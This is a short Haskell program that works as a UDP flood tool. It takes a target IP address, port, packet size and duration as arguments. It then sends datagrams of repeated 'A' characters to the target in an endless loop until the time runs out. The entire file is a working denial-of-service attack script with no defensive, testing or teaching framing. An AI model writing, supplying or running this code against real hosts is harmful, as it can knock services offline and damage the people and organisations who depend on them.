module Main where

import Network.Socket hiding (sendTo)
import Network.Socket.ByteString
import Data.ByteString.Char8 (pack)
import System.Environment
import Control.Concurrent
import Control.Monad

main :: IO ()
main = do
    (ip:port:size:time:_) <- getArgs
    forkIO $ flood ip (read port) (read size) (read time)
    threadDelay $ (read time) * 1000000
    return ()

flood :: String -> Int -> Int -> Int -> IO ()
flood ip port size time = withSocketsDo $ do
    addrinfo <- getAddrInfo Nothing (Just ip) (Just $ show port)
    let target = addrAddress (head addrinfo)

    sock <- socket AF_INET Datagram defaultProtocol
    forever $ loop sock target
  where loop sock target = do
            sendTo sock str target
        str = pack $ replicate size 'A'